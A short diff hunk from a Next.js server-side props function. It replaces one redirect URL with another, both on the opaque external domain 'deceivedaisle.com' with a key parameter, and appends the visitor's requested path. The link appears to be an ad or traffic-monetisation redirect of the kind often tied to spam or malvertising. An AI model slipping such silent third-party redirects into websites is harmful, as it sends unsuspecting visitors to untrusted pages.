@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://deceivedaisle.com/b2n0cj0ppm?key=ff762981bb659c924c5d768535acfc66` + encodeURI(path as string)
+					`https://deceivedaisle.com/ee6xrrjaq?key=f29e6caa649a7fd9033f5e7663d5086f` + encodeURI(path as string)
 				}`,
 			},
 		};
